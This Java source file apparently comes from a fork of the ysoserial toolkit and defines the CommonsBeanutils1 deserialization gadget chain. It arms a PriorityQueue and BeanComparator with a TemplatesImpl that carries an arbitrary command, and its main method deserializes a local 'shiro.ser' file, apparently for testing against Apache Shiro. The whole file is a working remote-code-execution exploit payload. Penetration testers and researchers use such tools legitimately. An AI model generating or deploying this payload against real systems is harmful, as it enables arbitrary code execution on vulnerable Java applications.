package ys.payloads;

import org.apache.commons.beanutils.BeanComparator;
import ys.payloads.annotation.Authors;
import ys.payloads.annotation.Dependencies;
import ys.payloads.util.Gadgets;
import ys.payloads.util.Reflections;

import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.math.BigInteger;
import java.util.PriorityQueue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils1 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		Object templates  = Gadgets.createTemplatesImpl(command);

		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		//PayloadRunner.run(CommonsBeanutils1.class, args);
		//CommonsBeanutils1 cb1 = new CommonsBeanutils1();
		//ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.8.3.ser"));
		//oos.writeObject(cb1.getObject("calc"));
		//oos.flush();
		//oos.close();
		ObjectInputStream ois = new ObjectInputStream(new FileInputStream("/Users/c0ny1/Documents/codebak/ysoserial-sglab-old/shiro.ser"));
		ois.readObject();
	}
}
